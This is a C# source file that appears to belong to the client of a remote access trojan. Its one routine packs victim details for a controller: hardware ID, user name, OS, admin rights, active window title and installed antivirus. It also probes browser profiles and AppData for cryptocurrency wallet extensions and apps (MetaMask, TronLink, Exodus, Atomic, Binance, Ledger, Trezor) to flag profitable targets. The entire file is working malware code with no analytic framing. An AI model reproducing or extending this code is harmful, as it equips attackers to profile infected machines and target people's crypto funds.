using System;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper;

public static class IdSender
{
	public static byte[] SendInfo()
	{
		MsgPack msgPack = new MsgPack();
		try
		{
			msgPack.ForcePathObject("Packet").AsString = "ClientInfo";
			msgPack.ForcePathObject("HWID").AsString = Settings.Hwid;
			msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString();
			msgPack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft Windows", "Win").Replace("Pro", "")
				.Replace("Home", "")
				.Replace("Single language", "")
				.Replace("Single", "")
				.Replace("Language", "")
				.Replace("Enterprise LTSC", "")
				.Replace("Enterprise", "")
				.Replace("Language", "")
				.Replace("Language", "")
				.Replace("Standard", "");
			msgPack.ForcePathObject("Path").AsString = Path.ChangeExtension(Application.ExecutablePath, null);
			msgPack.ForcePathObject("Version").AsString = Settings.Version;
			msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower()
				.Replace("true", "Admin")
				.Replace("false", "User");
			msgPack.ForcePathObject("Performance").AsString = Methods.GetActiveWindowTitle();
			msgPack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
			msgPack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "E-";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "E1-";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "C";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "1";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "2";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 3\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "3-";
			}
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				for (int i = 0; i < directories.Length; i++)
				{
					if (File.Exists(directories[i] + "\\extensions\\webextension@metamask.io.xpi"))
					{
						msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "F";
					}
				}
			}
			string path2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				for (int i = 0; i < directories.Length; i++)
				{
					if (File.Exists(directories[i] + "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\LOCK"))
					{
						msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "-Br";
					}
				}
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "(TU)";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "(TU1)";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 2\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "(TU1)";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph\\LOCK"))
			{
				msgPack.ForcePathObject("Puplic").AsString = msgPack.ForcePathObject("Puplic").AsString + "(TU E)";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai\\LOCK"))
			{
				msgPack.ForcePathObject("btccore").AsString = "2FA";
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai\\LOCK"))
			{
				msgPack.ForcePathObject("btccore").AsString = "2FA";
			}
			else
			{
				msgPack.ForcePathObject("btccore").AsString = "False";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Exodus\\exodus.conf.json"))
			{
				msgPack.ForcePathObject("Exodus").AsString = "Exodus";
			}
			else
			{
				msgPack.ForcePathObject("Exodus").AsString = "False";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\atomic\\Cookies"))
			{
				msgPack.ForcePathObject("atomic").AsString = "Atomic";
			}
			else
			{
				msgPack.ForcePathObject("atomic").AsString = "False";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\binance\\Preferences"))
			{
				msgPack.ForcePathObject("Binance").AsString = "Binance";
			}
			else
			{
				msgPack.ForcePathObject("Binance").AsString = "False";
			}
			msgPack.ForcePathObject("Installed").AsString = "False";
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Ledger Live\\app.json"))
			{
				msgPack.ForcePathObject("Installed").AsString = "ledger";
			}
			else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\@trezor\\suite-desktop\\config.json"))
			{
				msgPack.ForcePathObject("Installed").AsString = "trezor";
			}
			msgPack.ForcePathObject("Pong").AsString = "";
			msgPack.ForcePathObject("Group").AsString = Settings.Group;
			msgPack.ForcePathObject("LastTime").AsString = Methods.Time;
		}
		catch
		{
		}
		return msgPack.Encode2Bytes();
	}
}
